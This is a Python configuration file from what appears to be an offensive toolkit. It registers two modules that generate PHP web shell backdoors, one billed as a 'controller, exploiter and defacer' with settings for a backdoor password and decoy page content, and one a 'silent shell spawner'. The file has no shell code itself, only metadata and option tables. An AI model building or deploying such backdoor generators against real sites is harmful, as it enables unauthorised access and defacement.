# Modules configuration file
# You can add your module here
available_modules = {
    "php_owner" : {
        "Name" : "PHP OWN3R",
        "Version" : "0.1",
        "cfg_path" : "modules/php",
        "Description" : "PHP web shell - controller, exploiter and defacer module",
        "Author" : "Yessine Taktak",
        "DefOptions" : ["Filename", "", "0", "Backdoor's name", "Password", "", "0", "Backdoor's password", "Content", "", "0", "Displayed conent when opened.", "Path", "/", "0", "Generation path."],
        "Options" : {
            "rows" : ["Option", "Value", "Required", "Description"],
            "columns" : ["Filename", "", "0", "Backdoor's name", "Password", "", "0", "Backdoor's password", "Content", "", "0", "Displayed conent when opened.", "Path", "/", "0", "Generation path."]
        },
        "DB_options" : {
            "Filename" : {
                "i" : 1,
                "r" : 2
            },
            "Password" : {
                "i" : 5,
                "r" : 6
            },
            "Content" : {
                "i" : 9,
                "r" : 10
            },
            "Path" : {
                "i" : 13,
                "r" : 14
            }
        },
        "Help" : '''
   __
   \ \_____
###[==_____>
   /_/      __
            \ \_____
         ###[==_____>
            /_/

   PHP OWN3R - MESS WITH THE BEST / DIE LIKE THE REST
   By Yessine Taktak

        '''
    },
    "php_s1l3nt" : {
        "Name" : "PHP S1L3NT",
        "Version" : "0.1",
        "cfg_path" : "modules/sphp",
        "Description" : "PHP silent web shell - spawn a shell",
        "Author" : "Yessine Taktak",
        "DefOptions" : ["Filename", "", "0", "Backdoor's name", "Path", "/", "0", "Generation path."],
        "Options" : {
            "rows" : ["Option", "Value", "Required", "Description"],
            "columns" : ["Filename", "", "0", "Backdoor's name", "Path", "/", "0", "Generation path."]
        },
        "DB_options" : {
            "Filename" : {
                "i" : 1,
                "r" : 2
            },
            "Path" : {
                "i" : 5,
                "r" : 6
            }
        },
        "Help" : '''
   PHP S1L3NT - Silent shell spawner
   By Yessine Taktak

        '''
    }
}
